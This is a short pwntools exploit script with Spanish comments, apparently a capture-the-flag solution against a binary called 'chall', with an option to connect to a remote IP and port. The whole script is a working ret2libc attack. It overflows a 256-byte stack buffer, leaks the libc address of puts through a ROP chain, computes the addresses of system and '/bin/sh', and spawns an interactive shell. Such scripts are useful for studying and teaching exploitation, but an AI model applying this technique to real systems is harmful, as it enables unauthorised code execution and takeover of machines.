from pwn import *

# Establecemos el contexto a amd64:
context.arch = "amd64"

binary 	= ELF("./chall")

# Según si remoto o local:
if args.REMOTE:
	io 		= remote("167.235.18.25",10000)
	libc	= "./libc-2.27.so"
else:
	libc	= "/lib/x86_64-linux-gnu/libc.so.6"
	if args.GDB:
		io = gdb.debug(binary.path)
	else:
		io = process(binary.path)

# Abrimos la versión de libc6 correspondiente:
libc6	=	ELF(libc)

# Padding de 256 + RBP:
padding = b'A'*256
RBP		= p64(0xdeadbeef)

# El payload básico antes del ROP:
payload	= padding + RBP

# Algunos gadgets necesarios para el ataque:
pop_rdi	=	0x0401253

# Como el binario no tiene PIE, no necesitamos un leak de su segmento de texto:
main = binary.symbols["main"]
info("main at %s", hex(main).zfill(8))

# Necesitamos, eso sí, un leak de la libc6.  Haremos lo clásico;
puts_plt 	=	binary.symbols["got.puts"]
puts		=	binary.symbols["puts"]
info("puts@plt at %s", hex(puts_plt).zfill(8))
info("puts at %s", hex(puts).zfill(8))

# Montamos un ROP sencillo para extraer la dirección de la libc6 de puts:
leak_puts	=	p64(pop_rdi)
leak_puts	+=	p64(puts_plt)
leak_puts	+=	p64(puts)
leak_puts	+=	p64(main)

# Lanzamos el ataque, primera pasada para extraer la libc6:
io.sendlineafter("esto?",payload+leak_puts)
# Obtenemos el leak de la libc6:
data = io.recvuntil("esto?")
leak	= int(data[1:7][::-1].hex(),16)
info("puts@libc6 leak is %s", hex(leak).zfill(8))

# Calculamos la dirección base de la libc6:
libc6_base	=	leak - libc6.symbols["puts"]
info("libc6 base is %s", hex(libc6_base).zfill(8))

# System , /bin/sh:
system	=	libc6_base + libc6.symbols["system"]
bin_sh	=	libc6_base + next(libc6.search(b'/bin/sh'))
info("system at %s", hex(system).zfill(8))
info("bin_sh at %s", hex(bin_sh))

exit	=	libc6_base + libc6.symbols["exit"]
info("exit at %s", hex(exit).zfill(8))

# Lanzamos ahora la segunda pasada para ejecutar system:
# system("/bin/sh")
shell	=	p64(pop_rdi)
shell	+=	p64(bin_sh)
# Alinear el stack:
shell	+=	p64(0x40101a)	# ret;
shell	+=	p64(system)
# exit(0)
shell	+=	p64(pop_rdi)
shell	+=	p64(0x0)
shell	+=	p64(exit)

io.send(payload + shell)
io.interactive()
